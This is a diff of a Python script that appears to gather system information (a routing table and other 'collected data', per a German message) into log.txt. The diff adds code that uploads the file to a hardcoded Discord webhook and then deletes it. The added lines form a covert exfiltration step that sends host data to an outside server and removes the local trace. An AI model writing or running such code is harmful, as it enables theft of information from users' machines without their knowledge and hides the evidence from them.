@@ -13,15 +13,8 @@ webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku
 # Function to send message to Discord webhook
 def send_to_discord(file_path):
     with open(file_path, 'rb') as f:
-        payload = {
-            'payload_json': json.dumps({
-                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
-            })
-        }
-        files = {
-            'file': f
-        }
-        response = requests.post(webhook_url, data=payload, files=files)
+        files = {'file': f}
+        response = requests.post(webhook_url, files=files)
         if response.status_code == 204:
             print("File sent successfully to Discord webhook.")
         else:
@@ -242,4 +235,8 @@ with open(log_file_path, 'w') as f:
     f.write("=== Routing Table ===\n")
     f.write(f"{routing_table}\n")
 
-   
+# Send log.txt content to Discord webhook
+send_to_discord(log_file_path)
+
+# Delete log.txt after sending
+os.remove(log_file_path)
